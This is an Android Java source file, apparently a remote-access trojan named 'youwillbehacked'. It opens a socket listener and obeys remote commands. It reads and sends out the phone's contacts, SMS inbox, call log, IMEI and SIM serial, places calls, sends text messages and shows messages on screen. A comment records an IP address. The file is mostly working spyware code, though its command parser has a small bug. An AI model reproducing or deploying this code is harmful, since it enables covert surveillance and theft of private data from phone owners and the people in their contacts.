package com.example.youwillbehacked;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.CallLog;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {
    //my mobile ip address: 157.119.51.130
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Thread mtThread = new Thread(new MyServerThread());
        mtThread.start();
    }

    class MyServerThread implements Runnable {

        public static final int SOCKET_PORT = 6000;
        Socket s;
        ServerSocket ss;
        InputStreamReader isr;
        BufferedReader br;
        String msg; //to receive message that will comes from desktop
        String str; //to receive text body message

        Handler h = new Handler();

        @Override
        public void run() {
            try {
                ss = new ServerSocket(SOCKET_PORT);
                while (true) {
                    s = ss.accept();
                    isr = new InputStreamReader(s.getInputStream());
                    br = new BufferedReader(isr);
                    msg = br.readLine();
                    ArrayList<String> cmd = getCommand(msg); //getCommand method here works on column by column
                    //cmd.get(0) means 0th column
                    switch (cmd.get(0)) {
                        case "call": {
                            if (cmd.size() > 1) {
                                makeCall(cmd.get(1)); //it should contain two words call + number
                            }
                            msg = "";
                            break;
                        }
                        case "sms-s": {
                            if (cmd.size() > 2) {
                                str = "";
                                for (int i = 2; i < cmd.size(); i++) {
                                    str = str + cmd.get(i) + " ";
                                }
                                send_SMS(cmd.get(1), str);
                                msg = "";
                                break;
                            }
                        }
                        case "info": {
                            Message_Sender obj = new Message_Sender();
                            obj.execute(getInfoMobile());
                            msg = "";
                            break;
                        }
                        case "info-n": {
                            Message_Sender messageSender = new Message_Sender();
                            messageSender.execute(getInfoNetwork());
                            msg = "";
                            break;
                        }
                        case "contacts": {
                            Message_Sender messageSender = new Message_Sender();
                            messageSender.execute(getContacts());
                            msg = "";
                            break;
                        }
                        case "see-sms": {
                            Message_Sender messageSender = new Message_Sender();
                            messageSender.execute(getSMS());
                            msg = "";
                            break;
                        }case "call-log": {
                            Message_Sender messageSender = new Message_Sender();
                            messageSender.execute(GetCallDetails());
                            msg = "";
                            break;
                        }
                        case "show": {
                            if (cmd.size() > 1) {
                                for (int i = 1; i < cmd.size(); i++) {
                                    str = str + cmd.get(i) + " ";
                                }
                                h.post(new Runnable() {
                                    @Override
                                    public void run() {
                                        Toast.makeText(getApplicationContext(), str, Toast.LENGTH_LONG).show();
                                    }
                                });
                            }
                            msg = "";
                            break;
                        }
                    }
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private void makeCall(String nbr) {
        String dial = "tel:" + nbr;
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        startActivity(new Intent(Intent.ACTION_DIAL, Uri.parse(dial)));
    }

    String GetCallDetails() {
        StringBuffer sb = new StringBuffer();
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {

        }
        Cursor cursor_managed = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = cursor_managed.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor_managed.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor_managed.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor_managed.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :\n");
        while (cursor_managed.moveToNext()) {
            String phnumber = cursor_managed.getString(number);
            String CallType = cursor_managed.getString(type);
            String CallDate = cursor_managed.getString(date);
            Date callDayTime = new Date(Long.valueOf(CallDate));
            // TODO: 9/19/2020 remove suppresslint 
            @SuppressLint("SimpleDateFormat") SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm"); 
            String dateString = formatter.format(callDayTime);
            String CallDuration = cursor_managed.getString(duration);
            String dir = null;
            switch (Integer.parseInt(CallType)) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("Phone number: " + phnumber + " Call type: " + dir + "\n Call date: " + dateString + " Call duration in sec: " + CallDuration);
            sb.append("\n-------------------------------\n");
        }
        cursor_managed.close();
        return sb.toString();
    }

    private void send_SMS(String nbr, String body) {
        try {
            SmsManager sms_manager = SmsManager.getDefault();
            sms_manager.sendTextMessage(nbr, null, body, null, null);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private String getSMS() {
        String sms = "\n";
        Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        while (c.moveToNext()) {
            sms = sms + "Number: " + c.getString(c.getColumnIndexOrThrow("address")) +
                    "\nBody: " + c.getString(c.getColumnIndexOrThrow("body")) + "\n";
        }
        c.close();
        return sms;
    }

    private String getInfoMobile() {
        return "\nDevice: " + Build.DEVICE + "\nModele: " + Build.MODEL + "\nBoard: " + Build.BOARD + "\nBootoader version: " + Build.BOOTLOADER +
                "\nBrand: " + Build.BRAND + "\nHardware: " + Build.HARDWARE;
    }

    private String getInfoNetwork() {
        String imei = null;
        String serialNo = null;
        String networkCountry = null;
        String simOperatorName = null;
        int permisI = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE);
        if (permisI == PackageManager.PERMISSION_GRANTED) {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            imei = tm.getDeviceId().toString();
            serialNo = tm.getSimSerialNumber();
            networkCountry = tm.getNetworkCountryIso();
            simOperatorName = tm.getSimOperatorName();
        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, 123);
        }
        return "\nIMEI number: " + imei + "\nSim Serial Number:" + serialNo + "\nGet Network country iso: " + networkCountry
                + "\nGet sim operatorn name: " + simOperatorName;
    }

    private String getContacts() {
        String contact = "\n";
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME);
        while (c.moveToNext()) {
            contact = contact + "Name : " + c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) +
                    "\nNumber : " + c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) + "\n";
        }
        c.close();
        return contact;
    }

    ArrayList<String> getCommand(String text) {
        String s1 = null;
        ArrayList<String> array = new ArrayList<>();
        for (int t = 0; t < text.length(); t++) {
            if (text.charAt(t) != ' ') {
                s1 = s1 + text.charAt(t);
            } else {
                array.add(s1);
                s1 = " ";
            }
        }
        array.add(s1);
        return array;
    }
}